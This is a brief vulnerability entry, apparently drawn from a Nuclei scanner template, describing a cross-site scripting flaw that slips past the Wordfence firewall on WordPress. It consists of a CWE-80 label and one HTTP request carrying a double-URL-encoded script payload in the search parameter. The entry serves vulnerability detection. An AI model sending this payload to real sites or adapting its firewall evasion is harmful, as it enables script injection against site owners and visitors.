# Vulnerability: Wordpress Wordfence - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`wordpress-wordfence-waf-bypass-xss.yaml`)

## Description
Wordpress Wordfence is vulnerable to cross-site scripting.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
```

